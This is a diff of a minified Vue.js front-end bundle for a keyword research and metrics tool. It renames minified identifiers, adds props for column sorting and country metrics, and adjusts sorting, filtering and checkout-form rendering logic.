         class: "checkout-form-card-expiration-date-value form-control form-control"
     }, null, -1),
-    Dh = {
+    jh = {
         key: 0,
         class: "invalid-feedback"
     },
     Oh = {
         class: "checkout-form-card-cvv mb-3 col-md-6"
     },
-    jh = S("label", {
+    Wh = S("label", {
         class: "form-label",
         for: "card-cvv-stripe"
     }, [P("CVV "), S("span", {
@@ -7037,11 +7037,11 @@ const ah = Ue(wm, [
     Nh = {
         class: "text-muted"
     },
-    Rh = S("i", {
+    Bh = S("i", {
         class: "bi bi-lock me-1"
     }, null, -1),
-    Kh = ["width", "src"];
-const Jh = Ue(oh, [
+    Rh = ["width", "src"];
+const Kh = Ue(oh, [
     ["render", function(e, t, r, s, a, o) {
         var i;
         const n = k("modal");
@@ -7082,8 +7082,8 @@ const Jh = Ue(oh, [
             [U, a.card_holder_name, void 0, {
                 trim: !0
             }]
-        ]), a.validating_card_holder_name && 0 == a.valid_card_holder_name ? (b(), g("div", Th, v(e.trans.get("Card holder name is required")), 1)) : T("", !0)]), S("div", Fh, [S("label", qh, [P(v(e.trans.get("Card Number")) + " " + v("visa_master" == r.payment_method ? "(Visa or Mastercard)" : "(American Express or JCB)") + " ", 1), Eh]), Uh, a.validating_card_number && 0 == a.valid_card_number ? (b(), g("div", Mh, v(e.trans.get("Sorry, the provided card number appears to be invalid.")), 1)) : T("", !0)]), S("div", Ah, [S("div", Ph, [S("label", Lh, [P(v(e.trans.get("Expiration")) + " ", 1), Bh]), $h, a.validating_card_expiry && 0 == a.valid_card_expiry ? (b(), g("div", Dh, v(e.trans.get("Card expiry is invalid.")), 1)) : T("", !0)]), S("div", Oh, [jh, Vh, a.validating_card_cvv && 0 == a.valid_card_cvv ? (b(), g("div", Hh, v(e.trans.get("Card CVV is invalid.")), 1)) : T("", !0)])])])), r.is_subscribe ? (b(), g("div", Ih, [S("small", Nh, [Rh, P(" " + v(e.trans.get("We use Stripe to handle payments and card information securely. Stripe is a Validated Level 1 PCI DSS Compliant Service Provider. All pages on our website are secured with modern SSL/TLS encryption.")), 1)])])) : T("", !0)], 544), [
-            [B, !r.hide_form]
+        ]), a.validating_card_holder_name && 0 == a.valid_card_holder_name ? (b(), g("div", Th, v(e.trans.get("Card holder name is required")), 1)) : T("", !0)]), S("div", Fh, [S("label", qh, [P(v(e.trans.get("Card Number")) + " " + v("visa_master" == r.payment_method ? "(Visa or Mastercard)" : "(American Express or JCB)") + " ", 1), Eh]), Uh, a.validating_card_number && 0 == a.valid_card_number ? (b(), g("div", Mh, v(e.trans.get("Sorry, the provided card number appears to be invalid.")), 1)) : T("", !0)]), S("div", Ah, [S("div", Ph, [S("label", $h, [P(v(e.trans.get("Expiration")) + " ", 1), Lh]), Dh, a.validating_card_expiry && 0 == a.valid_card_expiry ? (b(), g("div", jh, v(e.trans.get("Card expiry is invalid.")), 1)) : T("", !0)]), S("div", Oh, [Wh, Vh, a.validating_card_cvv && 0 == a.valid_card_cvv ? (b(), g("div", Hh, v(e.trans.get("Card CVV is invalid.")), 1)) : T("", !0)])])])), r.is_subscribe ? (b(), g("div", Ih, [S("small", Nh, [Bh, P(" " + v(e.trans.get("We use Stripe to handle payments and card information securely. Stripe is a Validated Level 1 PCI DSS Compliant Service Provider. All pages on our website are secured with modern SSL/TLS encryption.")), 1)])])) : T("", !0)], 544), [
+            [L, !r.hide_form]
         ]), a.secure_url ? (b(), x(n, {
             key: 0,
             width: e.$isMobile() ? "290px" : "425px",
@@ -7093,15 +7093,15 @@ const Jh = Ue(oh, [
                 width: e.$isMobile() ? "250px" : "390px",
                 height: "400px",
                 src: a.secure_url
-            }, null, 8, Kh)])),
+            }, null, 8, Rh)])),
             _: 1
         }, 8, ["width"])) : T("", !0)])
     }]
 ]);
 oe.register(ie, ne, le, ce, _e, ue);
-const Wh = Ue({
+const Jh = Ue({
         components: {
-            Bar: $
+            Bar: D
         },
         props: {
             charttitle: {
@@ -7632,7 +7632,7 @@ const np = Ue({
             }, null, 8, ["options", "data"])], 40, sp)) : T("", !0), o.linedata && a.ispopup ? (b(), g("div", {
                 key: 1,
                 class: f(["chart-popover popover shadow", a.popupclass]),
-                style: D(a.popupstyle),
+                style: j(a.popupstyle),
                 width: o.popupwidth,
                 height: o.popupheight,
                 id: "popup-chart-" + a.id,
@@ -7643,7 +7643,7 @@ const np = Ue({
             }, [S("div", {
                 id: "caret" + a.id,
                 class: "position-absolute popover-arrow",
-                style: D(a.popupcaretstyle)
+                style: j(a.popupcaretstyle)
             }, null, 12, op), S("div", ip, [a.ispopup ? (b(), x(n, {
                 key: 0,
                 width: o.chartpopupwidth,
@@ -7864,12 +7864,12 @@ const up = Ue({
                 default: ""
             },
             default_metrics_is_estimated: {
-                type: [String],
+                type: [String, Number],
                 required: !1,
                 default: ""
             },
             default_metrics_is_default_location: {
-                type: [String],
+                type: [String, Number],
                 required: !1,
                 default: ""
             },
@@ -7879,6 +7879,11 @@ const up = Ue({
                 default: function() {
                     return []
                 }
+            },
+            default_metrics_country: {
+                type: String,
+                required: !1,
+                default: ""
             },
             default_metrics_currency: {
                 type: [String, Number],
@@ -8229,6 +8234,11 @@ const up = Ue({
                 required: !1,
                 default: ""
             },
+            date: {
+                type: String,
+                required: !1,
+                default: ""
+            },
             permissions: {
                 type: Object,
                 required: !1,
@@ -8323,6 +8333,11 @@ const up = Ue({
                 required: !1,
                 default: !1
             },
+            keywords_column_sort: {
+                type: Boolean,
+                required: !1,
+                default: !0
+            },
             reset_keywords_url: {
                 type: String,
                 required: !1,
@@ -8379,6 +8394,7 @@ const up = Ue({
             current_metrics_currency: "",
             current_metrics_language: [],
             current_metrics_network: null,
+            current_metrics_country: null,
             current_filter_keywords: null,
             current_filter_keywords_partial_match: null,
             current_filter_search_volume_min: null,
@@ -8748,16 +8764,16 @@ const up = Ue({
                             var e;
                             this.current_metrics_location = [], null == (e = document.getElementById("metrics_locations_selection")) || e.find("option").remove().end().trigger("change"), this.metrics_location.forEach(((e, t) => {
                                 var r, s = new Option(e.location_name, e.location_id, !0, !0);
-                                null == (r = document.getElementById("metrics_locations_selection")) || r.append(s).trigger("change"), this.current_metrics_location.push(e.location_id)
+                                null == (r = document.getElementById("metrics_locations_selection")) || r.append(s).trigger("change"), this.current_metrics_location.push(e.location_id), this.current_metrics_country = e.country_code
                             }))
-                        })), this.current_metrics_currency = this.metrics_currency, this.current_metrics_language = this.metrics_language, this.current_metrics_network = this.metrics_network, this.prepend_current_metrics_location = this.selected_metrics_location_name, this.current_filter_keywords = this.filter_keywords.join("\n"), this.current_filter_keywords_partial_match = this.filter_keywords_partial_match, this.current_filter_search_volume_min = this.filter_search_volume_min, this.current_filter_search_volume_max = this.filter_search_volume_max, this.current_filter_search_volume_trend_min = this.filter_search_volume_trend_min, this.current_filter_search_volume_trend_max = this.filter_search_volume_trend_max, this.current_filter_average_cpc_min = this.filter_average_cpc_min, this.current_filter_average_cpc_max = this.filter_average_cpc_max, this.current_filter_competition_min = this.filter_competition_min, this.current_filter_competition_max = this.filter_competition_max, this.current_filter_competition = this.filter_competition ? this.filter_competition.split(",") : [], this.current_filter_low_top_page_bid_min = this.filter_low_top_page_bid_min, this.current_filter_low_top_page_bid_max = this.filter_low_top_page_bid_max, this.current_filter_high_top_page_bid_min = this.filter_high_top_page_bid_min, this.current_filter_high_top_page_bid_max = this.filter_high_top_page_bid_max, this.current_filter_price_min = this.filter_price_min, this.current_filter_price_max = this.filter_price_max, this.current_filter_posts_min = this.filter_posts_min, this.current_filter_posts_max = this.filter_posts_max, this.current_filter_followings_min = this.filter_followings_min, this.current_filter_followings_max = this.filter_followings_max, this.current_filter_followers_min = this.filter_followers_min, this.current_filter_followers_max = this.filter_followers_max, this.current_filter_heart_count_min = this.filter_heart_count_min, this.current_filter_heart_count_max = this.filter_heart_count_max, this.current_filter_video_count_min = this.filter_video_count_min, this.current_filter_video_count_max = this.filter_video_count_max, this.current_filter_digg_count_min = this.filter_digg_count_min, this.current_filter_digg_count_max = this.filter_digg_count_max, this.current_filter_view_count_min = this.filter_view_count_min, this.current_filter_view_count_max = this.filter_view_count_max, this.current_negative_keywords = this.negative_keywords.join("\n"), this.current_filter_keyword_result_period = this.keyword_result_period, this.current_filter_full_name = this.filter_full_name, this.current_filter_is_private = this.filter_is_private, this.current_filter_is_verified = this.filter_is_verified, this.current_filter_currency = this.filter_currency, this.current_filter_location = this.filter_location, this.current_filter_language = this.filter_language, this.current_filter_is_on = this.filter_is_on, this.current_permissions = this.permissions, this.current_keyword_result_periods = this.keyword_result_periods, this.current_reset_keywords_url = this.reset_keywords_url, this.current_reset_latest_metrics_url = this.reset_latest_metrics_url, this.current_reset_all_metrics_url = this.reset_all_metrics_url, this.sort_by || (this.sort_by = this.$cookies.get("last_sort_by_" + this.search_engine), this.sort_by || (this.current_permissions.show_follower_count_data ? this.sort_by = "followerCount" : this.current_permissions.show_posts_data ? this.sort_by = "posts" : this.current_permissions.show_relative_popularity_column ? this.sort_by = "relativePopularity" : this.current_permissions.show_search_frequency_increase_data ? this.sort_by = "followerCount" : this.current_permissions.show_search_volume_data ? this.sort_by = "searchVolume" : this.sort_by = "keywords")), this.sort_direction || (this.sort_direction = this.$cookies.get("last_sort_direction_" + this.search_engine), this.sort_direction || ("keywords" == this.sort_by ? this.sort_direction = "Asc" : this.sort_direction = "Desc")), e(!0)
+                        })), this.current_metrics_currency = this.metrics_currency, this.current_metrics_language = this.metrics_language, this.current_metrics_network = this.metrics_network, this.prepend_current_metrics_location = this.selected_metrics_location_name, this.current_filter_keywords = this.filter_keywords.join("\n"), this.current_filter_keywords_partial_match = this.filter_keywords_partial_match, this.current_filter_search_volume_min = this.filter_search_volume_min, this.current_filter_search_volume_max = this.filter_search_volume_max, this.current_filter_search_volume_trend_min = this.filter_search_volume_trend_min, this.current_filter_search_volume_trend_max = this.filter_search_volume_trend_max, this.current_filter_average_cpc_min = this.filter_average_cpc_min, this.current_filter_average_cpc_max = this.filter_average_cpc_max, this.current_filter_competition_min = this.filter_competition_min, this.current_filter_competition_max = this.filter_competition_max, this.current_filter_competition = this.filter_competition ? this.filter_competition.split(",") : [], this.current_filter_low_top_page_bid_min = this.filter_low_top_page_bid_min, this.current_filter_low_top_page_bid_max = this.filter_low_top_page_bid_max, this.current_filter_high_top_page_bid_min = this.filter_high_top_page_bid_min, this.current_filter_high_top_page_bid_max = this.filter_high_top_page_bid_max, this.current_filter_price_min = this.filter_price_min, this.current_filter_price_max = this.filter_price_max, this.current_filter_posts_min = this.filter_posts_min, this.current_filter_posts_max = this.filter_posts_max, this.current_filter_followings_min = this.filter_followings_min, this.current_filter_followings_max = this.filter_followings_max, this.current_filter_followers_min = this.filter_followers_min, this.current_filter_followers_max = this.filter_followers_max, this.current_filter_heart_count_min = this.filter_heart_count_min, this.current_filter_heart_count_max = this.filter_heart_count_max, this.current_filter_video_count_min = this.filter_video_count_min, this.current_filter_video_count_max = this.filter_video_count_max, this.current_filter_digg_count_min = this.filter_digg_count_min, this.current_filter_digg_count_max = this.filter_digg_count_max, this.current_filter_view_count_min = this.filter_view_count_min, this.current_filter_view_count_max = this.filter_view_count_max, this.current_negative_keywords = this.negative_keywords.join("\n"), this.current_filter_keyword_result_period = this.keyword_result_period, this.current_filter_full_name = this.filter_full_name, this.current_filter_is_private = this.filter_is_private, this.current_filter_is_verified = this.filter_is_verified, this.current_filter_currency = this.filter_currency, this.current_filter_location = this.filter_location, this.current_filter_language = this.filter_language, this.current_filter_is_on = this.filter_is_on, this.current_permissions = this.permissions, this.current_keyword_result_periods = this.keyword_result_periods, this.current_reset_keywords_url = this.reset_keywords_url, this.current_reset_latest_metrics_url = this.reset_latest_metrics_url, this.current_reset_all_metrics_url = this.reset_all_metrics_url, !this.sort_by && this.keywords_column_sort && (this.sort_by = this.$cookies.get("last_sort_by_" + this.search_engine), this.sort_by || (this.current_permissions.show_follower_count_data ? this.sort_by = "followerCount" : this.current_permissions.show_posts_data ? this.sort_by = "posts" : this.current_permissions.show_relative_popularity_column ? this.sort_by = "relativePopularity" : this.current_permissions.show_search_frequency_increase_data ? this.sort_by = "followerCount" : this.current_permissions.show_search_volume_data ? this.sort_by = "searchVolume" : this.sort_by = "keywords")), !this.sort_direction && this.keywords_column_sort && (this.sort_direction = this.$cookies.get("last_sort_direction_" + this.search_engine), this.sort_direction || ("keywords" == this.sort_by ? this.sort_direction = "Asc" : this.sort_direction = "Desc")), e(!0)
                     } catch (r) {
                         t(Error(r))
                     }
                 }))
             },
             async sort(e) {
-                this.loading = !0, this.has_metrics = !1, this.has_error = !1, this.has_all_error = !1, this.keywords = [], this.has_more = !1, e == this.sort_by ? "Asc" == this.sort_direction ? this.sort_direction = "Desc" : this.sort_direction = "Asc" : e != this.sort_by && ("keywords" == this.sort_direction ? this.sort_direction = "Asc" : this.sort_direction = "Desc", this.sort_by = e), this.sort_by && this.$cookies.set("last_sort_by_" + this.search_engine, this.sort_by), this.sort_direction && this.$cookies.set("last_sort_direction_" + this.search_engine, this.sort_direction), this.metrics(!0)
+                this.all_keywords.length <= 1 || (this.loading = !0, this.has_metrics = !1, this.has_error = !1, this.has_all_error = !1, this.keywords = [], this.has_more = !1, e == this.sort_by ? "Asc" == this.sort_direction ? this.sort_direction = "Desc" : this.sort_direction = "Asc" : e != this.sort_by && ("keywords" == this.sort_direction ? this.sort_direction = "Asc" : this.sort_direction = "Desc", this.sort_by = e), this.sort_by && this.keywords_column_sort && this.$cookies.set("last_sort_by_" + this.search_engine, this.sort_by), this.sort_direction && this.keywords_column_sort && this.$cookies.set("last_sort_direction_" + this.search_engine, this.sort_direction), this.metrics(!0))
             },
             async filter(e = !1) {
                 this.loading = !0;
@@ -8770,12 +8786,6 @@ const up = Ue({
                             search_type: this.current_tab,
                             keyword_basket_search_engine: this.current_sub_tab,
                             time: this.current_time,
-                            country_location: window.param("country_location"),
-                            country_language: window.param("country_language"),
-                            metrics_is_default_location: !!this.current_metrics_is_default_location,
-                            metrics_is_estimated: !!this.current_metrics_is_estimated,
-                            metrics_location: this.current_metrics_location.toString(),
-                            metrics_language: this.current_metrics_language.toString(),
                             metrics_network: this.current_metrics_network ? this.current_metrics_network : null,
                             metrics_currency: this.current_metrics_currency ? this.current_metrics_currency : null,
                             filter_keywords: this.current_split_filter_keywords.length ? this.current_split_filter_keywords.toString() : "",
@@ -8855,20 +8865,21 @@ const up = Ue({
                 } else t = this.keywords.length;
                 try {
                     var r = {
-                            "Content-Type": "application/json",
-                            Token: this.current_token
-                        },
-                        s = await axios.post(this.metrics_url, {
-                            filter_keywords: this.current_filter_keywords.toString(),
-                            filter_keywords_partial_match: this.current_filter_keywords_partial_match,
-                            negative_keywords: this.current_negative_keywords.length ? this.current_negative_keywords.split("\n").map(((e, t) => e)).toString() : "",
-                            keywords_payload: this.keywords_payload,
-                            sort: this.sort_by + this.sort_direction,
-                            total: t,
-                            keyword_basket_search_engine: this.current_sub_tab
-                        }, {
-                            headers: r
-                        })
+                        "Content-Type": "application/json",
+                        Token: this.current_token
+                    };
+                    0 == this.keywords_column_sort && "keywords" == this.sort_by && (this.sort_by = "", this.sort_direction = "");
+                    var s = await axios.post(this.metrics_url, {
+                        filter_keywords: this.current_filter_keywords.toString(),
+                        filter_keywords_partial_match: this.current_filter_keywords_partial_match,
+                        negative_keywords: this.current_negative_keywords.length ? this.current_negative_keywords.split("\n").map(((e, t) => e)).toString() : "",
+                        keywords_payload: this.keywords_payload,
+                        sort: this.sort_by + this.sort_direction,
+                        total: t,
+                        keyword_basket_search_engine: this.current_sub_tab
+                    }, {
+                        headers: r
+                    })
                 } catch (i) {
                     return this.loading = !1, this.user_is_paid && (this.has_error = !0), e ? (this.has_metrics = !0, this.user_is_paid && (this.has_all_error = !0)) : this.catchError({
                         message: this.trans.get("An error occurred. Please try again!")
@@ -8885,7 +8896,7 @@ const up = Ue({
                         for (const t in s.data.all_keywords_data) e.push(t.toString());
                         this.all_keywords_data = s.data.all_keywords_data
                     }
-                    if (this.all_keywords = e, this.all_keywords.length && (this.has_metrics = !0), this.keywords = s.data.keywords, this.summaries = s.data.summaries, this.user_is_paid && (this.has_all_error || (this.has_all_error = s.data.has_all_error), this.has_error || (this.has_error = s.data.has_error)), this.free_results > 0 && this.keywords.length > 0)
+                    if (this.all_keywords = e, this.all_keywords.length && (this.has_metrics = !0), this.all_keywords.length <= 1 && (this.sort_by = "", this.sort_direction = ""), this.keywords = s.data.keywords, this.summaries = s.data.summaries, this.user_is_paid && (this.has_all_error || (this.has_all_error = s.data.has_all_error), this.has_error || (this.has_error = s.data.has_error)), this.free_results > 0 && this.keywords.length > 0)
                         for (var a = 0; a < this.free_results && (void 0 !== this.keywords[a] && "" !== this.keywords[a].search_volume && null !== this.keywords[a].search_volume); a++) this.negative_free_results -= 1
                 } else this.keywords = this.keywords.concat(s.data.keywords), this.has_error = s.data.has_error;
                 if (this.has_more = s.data.has_more, this.selected_all && (this.selected = this.all_keywords), s.data.validate_error && this.catchError({
@@ -9151,7 +9162,7 @@ const up = Ue({
                 t && bootstrap.Modal.getOrCreateInstance(t).hide(), this.filter(), this.appliedFilter = !0, this.clonedData = {}
             },
             showFilter() {
-                this.show_metrics_is_default_location = this.current_metrics_is_default_location, this.show_metrics_is_estimated = this.current_metrics_is_estimated, this.show_current_metrics_location = [...new Set(this.prepend_current_metrics_location)], this.show_current_metrics_language = this.language_list.filter((e => this.current_metrics_language.indexOf(e.id.toString()) >= 0)).map((e => e.name)), (t = this.current_currency_list.find((e => e.code == this.current_metrics_currency))) && this.default_metrics_currency != t.code ? this.show_current_metrics_currency = t.name : this.show_current_metrics_currency = "";
+                (t = this.current_currency_list.find((e => e.code == this.current_metrics_currency))) && this.default_metrics_currency != t.code ? this.show_current_metrics_currency = t.name : this.show_current_metrics_currency = "";
                 var e = this.current_network_list.find((e => e.id == this.current_metrics_network));
                 e && this.default_metrics_network != e.id ? this.show_current_metrics_network = e.name : this.show_current_metrics_network = "";
                 var t = this.current_currency_list.find((e => e.code == this.current_filter_currency));
@@ -9163,7 +9174,7 @@ const up = Ue({
                 this.show_current_filter_language = s ? s.text : "", this.show_current_filter_keywords = this.current_filter_keywords, this.show_current_filter_keywords_partial_match = this.current_filter_keywords_partial_match, this.show_current_filter_search_volume_min = parseInt(this.current_filter_search_volume_min), this.show_current_filter_search_volume_max = parseInt(this.current_filter_search_volume_max), this.show_current_filter_search_volume_trend_min = "" != this.current_filter_search_volume_trend_min && null != this.current_filter_search_volume_trend_min ? parseInt(this.current_filter_search_volume_trend_min) : null, this.show_current_filter_search_volume_trend_max = "" != this.current_filter_search_volume_trend_max && null != this.current_filter_search_volume_trend_max ? parseInt(this.current_filter_search_volume_trend_max) : null, this.show_current_filter_average_cpc_min = parseFloat(this.current_filter_average_cpc_min), this.show_current_filter_average_cpc_max = parseFloat(this.current_filter_average_cpc_max), this.show_current_filter_competition_min = parseInt(this.current_filter_competition_min), this.show_current_filter_competition_max = parseInt(this.current_filter_competition_max), this.show_current_filter_competition = this.current_filter_competition, this.show_current_filter_low_top_page_bid_min = parseFloat(this.current_filter_low_top_page_bid_min), this.show_current_filter_low_top_page_bid_max = parseFloat(this.current_filter_low_top_page_bid_max), this.show_current_filter_high_top_page_bid_min = parseFloat(this.current_filter_high_top_page_bid_min), this.show_current_filter_high_top_page_bid_max = parseFloat(this.current_filter_high_top_page_bid_max), this.show_current_filter_price_min = parseFloat(this.current_filter_price_min), this.show_current_filter_price_max = parseFloat(this.current_filter_price_max), this.show_current_filter_posts_min = parseInt(this.current_filter_posts_min), this.show_current_filter_posts_max = parseInt(this.current_filter_posts_max), this.show_current_filter_followings_min = parseInt(this.current_filter_followings_min), this.show_current_filter_followings_max = parseInt(this.current_filter_followings_max), this.show_current_filter_followers_min = parseInt(this.current_filter_followers_min), this.show_current_filter_followers_max = parseInt(this.current_filter_followers_max), this.show_current_filter_heart_count_min = parseInt(this.current_filter_heart_count_min), this.show_current_filter_heart_count_max = parseInt(this.current_filter_heart_count_max), this.show_current_filter_video_count_min = parseInt(this.current_filter_video_count_min), this.show_current_filter_video_count_max = parseInt(this.current_filter_video_count_max), this.show_current_filter_digg_count_min = parseInt(this.current_filter_digg_count_min), this.show_current_filter_digg_count_max = parseInt(this.current_filter_digg_count_max), this.show_current_filter_view_count_min = parseInt(this.current_filter_view_count_min), this.show_current_filter_view_count_max = parseInt(this.current_filter_view_count_max), this.show_current_negative_keywords = this.current_negative_keywords, this.show_current_filter_keyword_result_period = this.current_filter_keyword_result_period, this.show_current_filter_full_name = this.current_filter_full_name, this.show_current_filter_is_private = this.current_filter_is_private, this.show_current_filter_is_verified = this.current_filter_is_verified
             },
             resetFilter() {
-                4 != this.current_tab && (this.current_metrics_is_estimated = this.default_metrics_is_estimated, this.current_metrics_currency = this.default_metrics_currency, this.current_metrics_network = this.default_metrics_network), this.current_filter_keywords = "", this.current_filter_keywords_partial_match = null, this.current_filter_search_volume_min = null, this.current_filter_search_volume_max = null, this.current_filter_search_volume_trend_min = null, this.current_filter_search_volume_trend_max = null, this.current_filter_average_cpc_min = null, this.current_filter_average_cpc_max = null, this.current_filter_competition_min = null, this.current_filter_competition_max = null, this.current_filter_competition = [], this.current_filter_low_top_page_bid_min = null, this.current_filter_low_top_page_bid_max = null, this.current_filter_high_top_page_bid_min = null, this.current_filter_high_top_page_bid_max = null, this.current_filter_price_min = null, this.current_filter_price_max = null, this.current_filter_posts_min = null, this.current_filter_posts_max = null, this.current_filter_followings_min = null, this.current_filter_followings_max = null, this.current_filter_followers_min = null, this.current_filter_followers_max = null, this.current_filter_heart_count_min = null, this.current_filter_heart_count_max = null, this.current_filter_video_count_min = null, this.current_filter_video_count_max = null, this.current_filter_digg_count_min = null, this.current_filter_digg_count_max = null, this.current_filter_view_count_min = null, this.current_filter_view_count_max = null, this.current_negative_keywords = "", this.current_filter_keyword_result_period = this.default_keyword_result_period, this.current_filter_full_name.splice(0, this.current_filter_full_name.length), this.current_filter_is_private = null, this.current_filter_is_verified = "", this.current_filter_currency = null, this.current_filter_location = null, this.current_filter_language = null, this.current_filter_is_on = !1, this.error_fields = {}
+                4 != this.current_tab && (this.current_metrics_currency = this.default_metrics_currency, this.current_metrics_network = this.default_metrics_network), this.current_filter_keywords = "", this.current_filter_keywords_partial_match = null, this.current_filter_search_volume_min = null, this.current_filter_search_volume_max = null, this.current_filter_search_volume_trend_min = null, this.current_filter_search_volume_trend_max = null, this.current_filter_average_cpc_min = null, this.current_filter_average_cpc_max = null, this.current_filter_competition_min = null, this.current_filter_competition_max = null, this.current_filter_competition = [], this.current_filter_low_top_page_bid_min = null, this.current_filter_low_top_page_bid_max = null, this.current_filter_high_top_page_bid_min = null, this.current_filter_high_top_page_bid_max = null, this.current_filter_price_min = null, this.current_filter_price_max = null, this.current_filter_posts_min = null, this.current_filter_posts_max = null, this.current_filter_followings_min = null, this.current_filter_followings_max = null, this.current_filter_followers_min = null, this.current_filter_followers_max = null, this.current_filter_heart_count_min = null, this.current_filter_heart_count_max = null, this.current_filter_video_count_min = null, this.current_filter_video_count_max = null, this.current_filter_digg_count_min = null, this.current_filter_digg_count_max = null, this.current_filter_view_count_min = null, this.current_filter_view_count_max = null, this.current_negative_keywords = "", this.current_filter_keyword_result_period = this.default_keyword_result_period, this.current_filter_full_name.splice(0, this.current_filter_full_name.length), this.current_filter_is_private = null, this.current_filter_is_verified = "", this.current_filter_currency = null, this.current_filter_location = null, this.current_filter_language = null, this.current_filter_is_on = !1, this.error_fields = {}
             },
             clearFilter(e, t) {
                 if ("all" == e || "keywords" == e) {
@@ -9844,7 +9855,7 @@ const hp = Ue({
         watch: {
             show_trends: {
                 handler(e, t) {
-                    1 == e && this.inittrends()
+                    1 == e && this.initTrends()
                 }
             }
         },
@@ -9920,22 +9931,22 @@ const hp = Ue({
     Pp = {
         key: 0
     },
-    Lp = {
+    $p = {
         key: 1,
         class: "text-muted"
     },
-    Bp = ["data-bs-content"],
-    $p = {
+    Lp = ["data-bs-content"],
+    Dp = {
         key: 1,
         class: "search-results-summary-search-volume-value text-blur h3"
     },
-    Dp = {
+    jp = {
         class: "col my-1"
     },
     Op = {
         key: 0
     },
-    jp = {
+    Wp = {
         class: "search-results-summary-average-trend-label"
     },
     Vp = ["data-bs-content"],
@@ -9950,17 +9961,17 @@ const hp = Ue({
         key: 0,
         class: "text-success"
     },
-    Rp = S("i", {
+    Bp = S("i", {
         class: "bi bi-arrow-up"
     }, null, -1),
-    Kp = {
+    Rp = {
         key: 1,
         class: "text-danger"
     },
-    Jp = S("i", {
+    Kp = S("i", {
         class: "bi bi-arrow-down"
     }, null, -1),
-    Wp = {
+    Jp = {
         key: 2
     },
     zp = {
@@ -10084,18 +10095,18 @@ const hp = Ue({
         class: "text-muted"
     },
     Pg = ["data-bs-content"],
-    Lg = {
+    $g = {
         key: 1,
         class: "search-results-summary-average-competition-value text-blur h3"
     },
-    Bg = {
+    Lg = {
         key: 1,
         class: "col my-1"
     },
-    $g = {
+    Dg = {
         class: "col my-1"
     },
-    Dg = {
+    jg = {
         key: 0
     },
     Og = {
@@ -10104,7 +10115,7 @@ const hp = Ue({
         "data-bs-target": "#search-results-setting-modal",
         type: "button"
     },
-    jg = S("i", {
+    Wg = S("i", {
         class: "bi bi-gear me-1"
     }, null, -1),
     Vg = {
@@ -10125,13 +10136,13 @@ const hp = Ue({
     Ng = {
         class: "row mt-2"
     },
-    Rg = S("div", {
+    Bg = S("div", {
         id: "google-trends-chart",
         class: "carousel-item"
     }, [S("div", {
         id: "chart_trends"
     })], -1),
-    Kg = S("div", {
+    Rg = S("div", {
         class: "carousel-indicators mt-1 mb-0 position-static"
     }, [S("button", {
         type: "button",
@@ -10144,10 +10155,10 @@ const hp = Ue({
         "data-bs-target": "#google-trends-carousel",
         "data-bs-slide-to": "1"
     })], -1),
-    Jg = {
+    Kg = {
         key: 1
     },
-    Wg = {
+    Jg = {
         class: "row mt-2"
     };
 const zg = Ue(pp, [
@@ -10160,19 +10171,19 @@ const zg = Ue(pp, [
                 "data-bs-placement": "bottom",
                 "data-bs-content": e.trans.get("Total Search Volume is the sum of Search Volume values for keywords that were found."),
                 "data-bs-trigger": "hover focus"
-            }, null, 8, Mp)]), r.current_permissions.show_search_volume_data ? (b(), g("div", Ap, [r.summaries.search_volume_format ? (b(), g("div", Pp, v(r.summaries.search_volume_format), 1)) : (b(), g("div", Lp, [S("span", {
+            }, null, 8, Mp)]), r.current_permissions.show_search_volume_data ? (b(), g("div", Ap, [r.summaries.search_volume_format ? (b(), g("div", Pp, v(r.summaries.search_volume_format), 1)) : (b(), g("div", $p, [S("span", {
                 class: "cursor-help",
                 "data-bs-content": e.trans.get("Sorry, Google does not provide data for these keywords at the moment."),
                 "data-bs-toggle": "popover-sv-summary",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, "-", 8, Bp)]))])) : (b(), g("div", $p, "88,888"))])) : T("", !0)]), S("div", Dp, [r.current_permissions.show_search_volume_column ? (b(), g("div", Op, [S("div", jp, [P(v(e.trans.get("Average Trend")) + " ", 1), S("i", {
+            }, "-", 8, Lp)]))])) : (b(), g("div", Dp, "88,888"))])) : T("", !0)]), S("div", jp, [r.current_permissions.show_search_volume_column ? (b(), g("div", Op, [S("div", Wp, [P(v(e.trans.get("Average Trend")) + " ", 1), S("i", {
                 class: "bi bi-info-circle-fill ms-1",
                 "data-bs-content": e.trans.get("Average Trend is the average of Trend values for keywords that were found."),
                 "data-bs-toggle": "popover-sv-summary",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, null, 8, Vp)]), r.current_permissions.show_search_volume_data ? (b(), g("div", Hp, [r.summaries.search_volume_trend_format ? (b(), g("div", Ip, [r.summaries.search_volume_trend > 0 ? (b(), g("span", Np, [Rp, P(" " + v(r.summaries.search_volume_trend_format), 1)])) : r.summaries.search_volume_trend < 0 ? (b(), g("span", Kp, [Jp, P(" " + v(r.summaries.search_volume_trend_format), 1)])) : (b(), g("span", Wp, [0 == r.summaries.search_volume_trend ? (b(), g("span", zp)) : T("", !0), P(" " + v(r.summaries.search_volume_trend_format), 1)]))])) : (b(), g("div", Yp, [S("span", {
+            }, null, 8, Vp)]), r.current_permissions.show_search_volume_data ? (b(), g("div", Hp, [r.summaries.search_volume_trend_format ? (b(), g("div", Ip, [r.summaries.search_volume_trend > 0 ? (b(), g("span", Np, [Bp, P(" " + v(r.summaries.search_volume_trend_format), 1)])) : r.summaries.search_volume_trend < 0 ? (b(), g("span", Rp, [Kp, P(" " + v(r.summaries.search_volume_trend_format), 1)])) : (b(), g("span", Jp, [0 == r.summaries.search_volume_trend ? (b(), g("span", zp)) : T("", !0), P(" " + v(r.summaries.search_volume_trend_format), 1)]))])) : (b(), g("div", Yp, [S("span", {
                 class: "cursor-help",
                 "data-bs-content": e.trans.get("Sorry, Google does not provide data for these keywords at the moment."),
                 "data-bs-toggle": "popover-sv-summary",
@@ -10218,7 +10229,7 @@ const zg = Ue(pp, [
                 "data-bs-toggle": "popover-sv-summary",
                 "data-bs-placement": "bottom",
                 "data-bs-trigger": "hover focus"
-            }, "-", 8, Pg)]))])) : (b(), g("div", Lg, "8.88"))])) : T("", !0)]), 12 == r.current_tab ? (b(), g("div", Bg)) : T("", !0), S("div", $g, [r.show_settings_button ? (b(), g("div", Dg, [S("button", Og, [jg, S("span", null, v(e.trans.get("Settings")), 1)])])) : T("", !0)])]), r.current_permissions.show_search_volume_data && r.summaries.search_volume_trend_data ? (b(), g(y, {
